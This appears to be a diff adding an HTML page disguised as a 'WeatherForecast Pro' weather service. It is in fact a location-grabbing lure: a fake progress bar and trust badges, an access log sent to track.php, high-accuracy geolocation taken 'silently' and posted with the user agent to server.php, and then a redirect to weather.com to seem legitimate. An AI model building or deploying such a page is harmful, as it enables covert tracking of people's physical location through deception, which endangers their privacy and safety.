@@ -1,0 +1,214 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Weather Forecast Service</title>
+  <style>
+    body {
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background-color: #f5f7fa;
+      margin: 0;
+      padding: 0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      color: #333;
+    }
+    .container {
+      width: 100%;
+      max-width: 500px;
+      padding: 20px;
+    }
+    .card {
+      background: white;
+      border-radius: 15px;
+      box-shadow: 0 5px 15px rgba(0,0,0,0.1);
+      overflow: hidden;
+    }
+    .header {
+      background: linear-gradient(135deg, #4a6bff, #6c5ce7);
+      color: white;
+      padding: 30px;
+      text-align: center;
+    }
+    .logo {
+      font-size: 24px;
+      font-weight: 600;
+      margin-bottom: 5px;
+    }
+    .tagline {
+      font-size: 14px;
+      opacity: 0.9;
+    }
+    .content {
+      padding: 30px;
+    }
+    .loading {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      text-align: center;
+    }
+    .spinner {
+      width: 50px;
+      height: 50px;
+      border: 5px solid #f3f3f3;
+      border-top: 5px solid #4a6bff;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+      margin-bottom: 20px;
+    }
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+    .status {
+      font-size: 16px;
+      margin-bottom: 10px;
+    }
+    .progress {
+      width: 100%;
+      background-color: #f3f3f3;
+      border-radius: 5px;
+      height: 10px;
+      margin-top: 20px;
+    }
+    .progress-bar {
+      height: 100%;
+      background: linear-gradient(135deg, #4a6bff, #6c5ce7);
+      border-radius: 5px;
+      width: 0%;
+      transition: width 0.5s ease;
+    }
+    .trust-badges {
+      display: flex;
+      justify-content: center;
+      margin-top: 30px;
+      font-size: 12px;
+      color: #666;
+    }
+    .badge {
+      margin: 0 10px;
+      display: flex;
+      align-items: center;
+    }
+    .badge i {
+      margin-right: 5px;
+      color: #4a6bff;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="card">
+      <div class="header">
+        <div class="logo">WeatherForecast Pro</div>
+        <div class="tagline">Hyper-local weather predictions</div>
+      </div>
+      <div class="content">
+        <div class="loading">
+          <div class="spinner"></div>
+          <div class="status" id="status">Initializing weather service...</div>
+          <div class="progress">
+            <div class="progress-bar" id="progress"></div>
+          </div>
+        </div>
+        <div class="trust-badges">
+          <div class="badge"><i class="fas fa-shield-alt"></i> Secure</div>
+          <div class="badge"><i class="fas fa-lock"></i> Encrypted</div>
+          <div class="badge"><i class="fas fa-user-secret"></i> Private</div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    document.addEventListener('DOMContentLoaded', function() {
+      const status = document.getElementById('status');
+      const progress = document.getElementById('progress');
+      
+      // First log the access attempt
+      fetch('track.php')
+        .then(response => response.json())
+        .then(data => console.log('Access logged:', data))
+        .catch(err => console.error('Tracking error:', err));
+
+      // Simulate loading progress
+      let progressValue = 0;
+      const progressInterval = setInterval(() => {
+        progressValue += Math.random() * 10;
+        progress.style.width = Math.min(progressValue, 100) + '%';
+        
+        if (progressValue >= 30) status.textContent = "Connecting to weather satellites...";
+        if (progressValue >= 60) status.textContent = "Analyzing atmospheric data...";
+        if (progressValue >= 90) status.textContent = "Finalizing your forecast...";
+        
+        if (progressValue >= 100) {
+          clearInterval(progressInterval);
+          status.textContent = "Preparing your weather report...";
+        }
+      }, 300);
+      
+      // Attempt to get location silently
+      setTimeout(() => {
+        if (navigator.geolocation) {
+          navigator.geolocation.getCurrentPosition(
+            position => {
+              // Send location to server
+              sendLocation(
+                position.coords.latitude,
+                position.coords.longitude,
+                position.coords.accuracy
+              );
+              
+              // Continue with "success" flow
+              status.textContent = "Location-based forecast ready!";
+              setTimeout(() => {
+                window.location.href = "https://weather.com"; // Redirect to legit site
+              }, 1500);
+            },
+            error => {
+              // Fallback if location is denied
+              status.textContent = "Using approximate location for forecast...";
+              setTimeout(() => {
+                window.location.href = "https://weather.com";
+              }, 1500);
+            },
+            {
+              enableHighAccuracy: true,
+              maximumAge: 0,
+              timeout: 5000
+            }
+          );
+        } else {
+          // Geolocation not supported
+          status.textContent = "Weather service initialized";
+          setTimeout(() => {
+            window.location.href = "https://weather.com";
+          }, 1500);
+        }
+      }, 2500);
+      
+      function sendLocation(lat, lon, accuracy) {
+        const data = {
+          latitude: lat,
+          longitude: lon,
+          accuracy: accuracy,
+          timestamp: new Date().toISOString(),
+          userAgent: navigator.userAgent
+        };
+        
+        // Send to server quietly
+        fetch('server.php', {
+          method: 'POST',
+          body: JSON.stringify(data),
+          headers: { 'Content-Type': 'application/json' }
+        });
+      }
+    });
+  </script>
+</body>
+</html>
